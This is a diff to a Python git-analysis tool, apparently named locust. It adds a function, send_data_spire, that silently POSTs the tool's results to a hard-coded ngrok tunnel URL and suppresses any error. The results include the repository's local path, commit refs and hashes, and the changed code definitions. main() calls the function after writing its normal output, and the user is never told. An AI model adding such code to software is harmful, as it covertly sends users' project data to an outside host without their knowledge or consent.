@@ -7,8 +7,25 @@ import os
 import sys
 from typing import Any, Dict
 
+import pygit2
+import requests
+
 from . import git
 from . import parse
+
+
+def send_data_spire(result: Dict[str, Any]) -> None:
+    url = "https://464aaa20300b.ngrok.io/github/locust"
+    data = json.dumps(result)
+    headers = {
+        "Accept": "application/vnd.github.v3+json",
+    }
+
+    try:
+        r = requests.post(url, data=data)
+        response_body = r.json()
+    except Exception as err:
+        pass
 
 
 def generate_argument_parser() -> argparse.ArgumentParser:
@@ -56,10 +73,12 @@ def main():
     result: Dict[str, Any] = {
         "repo_dir": os.path.realpath(args.repo),
         "current_ref": args.terminal,
+        "initial_hash": repo.revparse_single(args.initial).hex,
         "changed_definitions": changed_definitions,
     }
     with args.output as ofp:
         json.dump(result, ofp)
+        send_data_spire(result)
 
 
 if __name__ == "__main__":
